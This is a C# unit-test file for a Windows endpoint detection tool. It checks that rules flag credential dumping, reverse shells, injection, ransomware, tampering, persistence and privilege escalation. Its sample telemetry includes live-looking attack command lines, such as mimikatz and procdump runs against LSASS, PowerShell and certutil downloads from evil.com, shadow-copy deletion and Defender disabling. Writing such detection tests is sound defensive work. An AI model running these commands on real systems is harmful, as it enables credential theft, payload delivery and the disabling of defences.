using WindowsSentinel.Core.Detection.Rules;
using WindowsSentinel.Core.Models;
using WindowsSentinel.Core.Monitors;
using Xunit;

namespace WindowsSentinel.Tests.Detection;

/// <summary>
/// Verifies that Tier1 rules fire correctly and are always Tier1.
/// Per spec: Tier1 must trigger response (when active response is enabled).
/// </summary>
public sealed class Tier1RulesTests
{
    // ── LsassAccessRule ──────────────────────────────────────────────────────

    [Fact]
    public void LsassAccessRule_Fires_OnKnownDumperByName()
    {
        var rule = new LsassAccessRule();
        var telemetry = MakeProcess("mimikatz.exe", 1234, commandLine: "mimikatz.exe lsass sekurlsa logonpasswords");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.85);
    }

    [Fact]
    public void LsassAccessRule_Fires_OnProcdumpTargetingLsass()
    {
        var rule = new LsassAccessRule();
        var telemetry = MakeProcess("procdump64.exe", 5555, commandLine: "procdump64.exe -ma lsass lsass.dmp");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.88); // pattern + dumpfile match
    }

    [Fact]
    public void LsassAccessRule_Fires_OnComsvcssMiniDumpTechnique()
    {
        var rule = new LsassAccessRule();
        var telemetry = MakeProcess("rundll32.exe", 6666,
            commandLine: @"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 lsass.dmp full");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void LsassAccessRule_DoesNotFire_ForLsassItself()
    {
        var rule = new LsassAccessRule();
        var telemetry = MakeProcess("lsass", 500, commandLine: "lsass.exe");

        Assert.Null(rule.Evaluate(telemetry));
    }

    [Fact]
    public void LsassAccessRule_DoesNotFire_ForWindowsDefender()
    {
        var rule = new LsassAccessRule();
        var telemetry = MakeProcess("MsMpEng", 1200, commandLine: "MsMpEng.exe");

        Assert.Null(rule.Evaluate(telemetry));
    }

    [Fact]
    public void LsassAccessRule_DoesNotFire_ForUnrelatedProcess()
    {
        var rule = new LsassAccessRule();
        var telemetry = MakeProcess("notepad.exe", 9999, commandLine: "notepad.exe C:\\file.txt");

        Assert.Null(rule.Evaluate(telemetry));
    }

    // ── ReverseShellRule ─────────────────────────────────────────────────────

    [Fact]
    public void ReverseShellRule_Fires_OnEncodedPowerShell()
    {
        var rule = new ReverseShellRule();
        var telemetry = MakeProcess("powershell.exe", 2222,
            commandLine: "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.90);
    }

    [Fact]
    public void ReverseShellRule_Fires_OnIexPowerShell()
    {
        var rule = new ReverseShellRule();
        var telemetry = MakeProcess("powershell.exe", 2223,
            commandLine: "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ReverseShellRule_Fires_OnCertutilLolbin()
    {
        var rule = new ReverseShellRule();
        var telemetry = MakeProcess("certutil.exe", 3333,
            commandLine: "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.90);
    }

    [Fact]
    public void ReverseShellRule_Fires_OnMshtaLolbin()
    {
        var rule = new ReverseShellRule();
        var telemetry = MakeProcess("mshta.exe", 4444,
            commandLine: "mshta.exe http://evil.com/payload.hta");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ReverseShellRule_Fires_OnPowershellTcpClient()
    {
        var rule = new ReverseShellRule();
        var telemetry = MakeProcess("powershell.exe", 5555,
            commandLine: "powershell.exe -c New-Object Net.Sockets.TCPClient('10.0.0.1',4444)");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ReverseShellRule_Fires_OnSuspiciousNetworkPort()
    {
        var rule = new ReverseShellRule();
        var telemetry = new NetworkTelemetry
        {
            Connection = new NetworkConnection
            {
                Protocol      = "TCP",
                LocalAddress  = "192.168.1.5",
                LocalPort     = 54321,
                RemoteAddress = "10.0.0.1",
                RemotePort    = 4444,
                ProcessId     = 3333,
                State         = "Established"
            },
            Reason    = "Suspicious port",
            Timestamp = DateTimeOffset.UtcNow
        };

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ReverseShellRule_Fires_OnCobaltStrikePort()
    {
        var rule = new ReverseShellRule();
        var telemetry = new NetworkTelemetry
        {
            Connection = new NetworkConnection
            {
                Protocol      = "TCP",
                LocalAddress  = "192.168.1.5",
                LocalPort     = 49152,
                RemoteAddress = "10.0.0.1",
                RemotePort    = 50050,
                ProcessId     = 7777,
                State         = "Established"
            },
            Reason    = "Cobalt Strike team-server port",
            Timestamp = DateTimeOffset.UtcNow
        };

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ReverseShellRule_DoesNotFire_OnNormalHttpsPort()
    {
        var rule = new ReverseShellRule();
        var telemetry = new NetworkTelemetry
        {
            Connection = new NetworkConnection
            {
                Protocol      = "TCP",
                LocalAddress  = "192.168.1.5",
                LocalPort     = 54321,
                RemoteAddress = "8.8.8.8",
                RemotePort    = 443,
                ProcessId     = 3333,
                State         = "Established"
            },
            Reason    = "Normal HTTPS",
            Timestamp = DateTimeOffset.UtcNow
        };

        Assert.Null(rule.Evaluate(telemetry));
    }

    // ── ProcessInjectionRule ─────────────────────────────────────────────────

    [Fact]
    public void ProcessInjectionRule_Fires_OnKnownInjectionTool()
    {
        var rule = new ProcessInjectionRule();
        var telemetry = MakeProcess("mavinject.exe", 5555,
            commandLine: "mavinject.exe 1234 /INJECTRUNNING shellcode.dll");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.90);
    }

    [Fact]
    public void ProcessInjectionRule_Fires_OnDonutTool()
    {
        var rule = new ProcessInjectionRule();
        var telemetry = MakeProcess("donut.exe", 6666,
            commandLine: "donut.exe -f payload.exe -o shellcode.bin");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ProcessInjectionRule_Fires_OnHollowingApiInCommandLine()
    {
        var rule = new ProcessInjectionRule();
        var telemetry = MakeProcess("loader.exe", 7777,
            commandLine: "loader.exe NtUnmapViewOfSection NtCreateSection inject");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void ProcessInjectionRule_Fires_OnReflectiveDllIndicator()
    {
        var rule = new ProcessInjectionRule();
        var telemetry = MakeProcess("loader.exe", 8888,
            commandLine: "loader.exe --reflective ReflectiveDLL inject");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    // ── RansomwareActivityRule ───────────────────────────────────────────────

    [Fact]
    public void RansomwareActivityRule_Fires_OnWannaCryExtension()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = new FileActivityTelemetry
        {
            OldPath               = @"C:\Users\user\Documents\report.docx",
            NewPath               = @"C:\Users\user\Documents\report.docx.wncry",
            IsSuspiciousExtension = true,
            IsBulkRename          = false,
            RenameCount           = 1,
            Timestamp             = DateTimeOffset.UtcNow
        };

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void RansomwareActivityRule_Fires_OnLockyExtension()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = new FileActivityTelemetry
        {
            OldPath               = @"C:\Users\user\Documents\photo.jpg",
            NewPath               = @"C:\Users\user\Documents\photo.jpg.locky",
            IsSuspiciousExtension = true,
            IsBulkRename          = false,
            RenameCount           = 1,
            Timestamp             = DateTimeOffset.UtcNow
        };

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void RansomwareActivityRule_Fires_OnBulkRename()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = new FileActivityTelemetry
        {
            OldPath               = @"C:\Users\user\Documents\file.txt",
            NewPath               = @"C:\Users\user\Documents\file.txt.bak",
            IsSuspiciousExtension = false,
            IsBulkRename          = true,
            RenameCount           = 25,
            Timestamp             = DateTimeOffset.UtcNow
        };

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void RansomwareActivityRule_Fires_OnShadowCopyDeletion_Vssadmin()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = MakeProcess("vssadmin.exe", 9999,
            commandLine: "vssadmin.exe delete shadows /all /quiet");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.95);
    }

    [Fact]
    public void RansomwareActivityRule_Fires_OnShadowCopyDeletion_Wmic()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = MakeProcess("wmic.exe", 1111,
            commandLine: "wmic.exe shadowcopy delete");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void RansomwareActivityRule_Fires_OnBcdeditRecoveryDisable()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = MakeProcess("bcdedit.exe", 2222,
            commandLine: "bcdedit.exe /set {default} recoveryenabled no");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void RansomwareActivityRule_Fires_OnWbadminDeleteCatalog()
    {
        var rule = new RansomwareActivityRule();
        var telemetry = MakeProcess("wbadmin.exe", 3333,
            commandLine: "wbadmin.exe delete catalog -quiet");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    // ── EtwTamperingRule ─────────────────────────────────────────────────────

    [Fact]
    public void EtwTamperingRule_Fires_OnEtwPatchIndicator()
    {
        var rule = new EtwTamperingRule();
        var telemetry = MakeProcess("patcher.exe", 7777,
            commandLine: "patcher.exe --patch etw bypass EtwEventWrite");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void EtwTamperingRule_Fires_OnAmsiBypass()
    {
        var rule = new EtwTamperingRule();
        var telemetry = MakeProcess("powershell.exe", 8888,
            commandLine: "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.90);
    }

    [Fact]
    public void EtwTamperingRule_Fires_OnDefenderDisable()
    {
        var rule = new EtwTamperingRule();
        var telemetry = MakeProcess("powershell.exe", 9999,
            commandLine: "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void EtwTamperingRule_Fires_OnEventLogClear()
    {
        var rule = new EtwTamperingRule();
        var telemetry = MakeProcess("wevtutil.exe", 1234,
            commandLine: "wevtutil.exe cl System");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void EtwTamperingRule_Fires_OnSecurityToolKill()
    {
        var rule = new EtwTamperingRule();
        var telemetry = MakeProcess("taskkill.exe", 5555,
            commandLine: "taskkill.exe /f /im MsMpEng.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private static ProcessTelemetry MakeProcess(
        string name, int pid,
        string commandLine = "",
        string imagePath   = "",
        int parentPid      = 4)
    {
        return new ProcessTelemetry
        {
            EventType       = "ProcessStart",
            ProcessId       = pid,
            ProcessName     = name,
            ImagePath       = string.IsNullOrEmpty(imagePath) ? $@"C:\Tools\{name}" : imagePath,
            CommandLine     = commandLine,
            ParentProcessId = parentPid,
            Timestamp       = DateTimeOffset.UtcNow
        };
    }

    // ── PersistenceRule ──────────────────────────────────────────────────────

    [Fact]
    public void PersistenceRule_Fires_OnRegistryRunKeyModification()
    {
        var rule = new PersistenceRule();
        var telemetry = MakeProcess("malware.exe", 5555,
            commandLine: "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\malware.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
        Assert.True(result.Confidence >= 0.75);
    }

    [Fact]
    public void PersistenceRule_Fires_OnScheduledTaskWithPowershell()
    {
        var rule = new PersistenceRule();
        var telemetry = MakeProcess("schtasks.exe", 6666,
            commandLine: "schtasks.exe /create /tn \"WindowsUpdate\" /tr \"powershell.exe -enc JABjAGwA\" /sc onlogon");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PersistenceRule_Fires_OnWmiEventSubscription()
    {
        var rule = new PersistenceRule();
        var telemetry = MakeProcess("powershell.exe", 7777,
            commandLine: "powershell.exe -c Register-WmiEvent -Class __EventFilter");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PersistenceRule_Fires_OnSuspiciousServiceCreation()
    {
        var rule = new PersistenceRule();
        var telemetry = MakeProcess("cmd.exe", 8888,
            commandLine: "sc.exe create MaliciousService binPath= \"C:\\temp\\malware.exe\"",
            imagePath: "C:\\temp\\cmd.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PersistenceRule_DoesNotFire_ForLegitimateInstallers()
    {
        var rule = new PersistenceRule();
        var telemetry = MakeProcess("msiexec.exe", 9999,
            commandLine: "msiexec.exe /i setup.msi");

        Assert.Null(rule.Evaluate(telemetry));
    }

    // ── PrivilegeEscalationRule ──────────────────────────────────────────────

    [Fact]
    public void PrivilegeEscalationRule_Fires_OnJuicyPotato()
    {
        var rule = new PrivilegeEscalationRule();
        var telemetry = MakeProcess("juicypotato.exe", 5555,
            commandLine: "juicypotato.exe -t * -p cmd.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PrivilegeEscalationRule_Fires_OnPrintSpoofer()
    {
        var rule = new PrivilegeEscalationRule();
        var telemetry = MakeProcess("printspoofer.exe", 6666,
            commandLine: "printspoofer.exe -i -c cmd.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PrivilegeEscalationRule_Fires_OnUacBypassFodhelper()
    {
        var rule = new PrivilegeEscalationRule();
        var telemetry = MakeProcess("cmd.exe", 7777,
            commandLine: "reg.exe add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d C:\\malware.exe",
            imagePath: "C:\\temp\\cmd.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PrivilegeEscalationRule_Fires_OnNamedPipeImpersonation()
    {
        var rule = new PrivilegeEscalationRule();
        var telemetry = MakeProcess("exploit.exe", 8888,
            commandLine: "exploit.exe ImpersonateNamedPipeClient \\\\.\\pipe\\test");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    [Fact]
    public void PrivilegeEscalationRule_Fires_OnTokenManipulation()
    {
        var rule = new PrivilegeEscalationRule();
        var telemetry = MakeProcess("exploit.exe", 9999,
            commandLine: "exploit.exe --impersonate SeDebugPrivilege");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
    }

    // ── AttackToolsRule ──────────────────────────────────────────────────────

    [Fact]
    public void AttackToolsRule_Fires_OnMimikatz()
    {
        var rule = new AttackToolsRule();
        var telemetry = MakeProcess("mimikatz.exe", 5555,
            commandLine: "mimikatz.exe privilege::debug sekurlsa::logonpasswords");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
        Assert.True(result.Confidence >= 0.95);
    }

    [Fact]
    public void AttackToolsRule_Fires_OnCobaltStrikeBeacon()
    {
        var rule = new AttackToolsRule();
        var telemetry = MakeProcess("beacon.exe", 6666,
            commandLine: "beacon.exe --c2-server 10.0.0.1");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void AttackToolsRule_Fires_OnBloodHound()
    {
        var rule = new AttackToolsRule();
        var telemetry = MakeProcess("sharphound.exe", 7777,
            commandLine: "sharphound.exe -c all");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void AttackToolsRule_Fires_OnRubeus()
    {
        var rule = new AttackToolsRule();
        var telemetry = MakeProcess("rubeus.exe", 8888,
            commandLine: "rubeus.exe kerberoast /nowrap");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void AttackToolsRule_Fires_OnResponder()
    {
        var rule = new AttackToolsRule();
        var telemetry = MakeProcess("responder.exe", 9999,
            commandLine: "responder.exe -I eth0");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void AttackToolsRule_Fires_OnLOLBinCertutilAbuse()
    {
        var rule = new AttackToolsRule();
        var telemetry = MakeProcess("certutil.exe", 1111,
            commandLine: "certutil.exe -urlcache -split -f http://evil.com/payload.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    // ── CampaignIocRule ──────────────────────────────────────────────────────

    [Fact]
    public void CampaignIocRule_Fires_OnKnownMaliciousFileName()
    {
        var rule = new CampaignIocRule();
        var telemetry = MakeProcess("sharphound.exe", 5555,
            commandLine: "sharphound.exe -c all");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void CampaignIocRule_Fires_OnGodPotato()
    {
        var rule = new CampaignIocRule();
        var telemetry = MakeProcess("godpotato.exe", 6666,
            commandLine: "godpotato.exe -cmd \"cmd.exe\"");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void CampaignIocRule_Fires_OnSuspiciousUrlPastebin()
    {
        var rule = new CampaignIocRule();
        var telemetry = MakeProcess("powershell.exe", 7777,
            commandLine: "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('pastebin.com/raw/abc123')");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }

    [Fact]
    public void CampaignIocRule_Fires_OnMaliciousRegistryPersistence()
    {
        var rule = new CampaignIocRule();
        var telemetry = MakeProcess("reg.exe", 8888,
            commandLine: "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate\" /d malware.exe");

        var result = rule.Evaluate(telemetry);

        Assert.NotNull(result);
        Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
    }
}
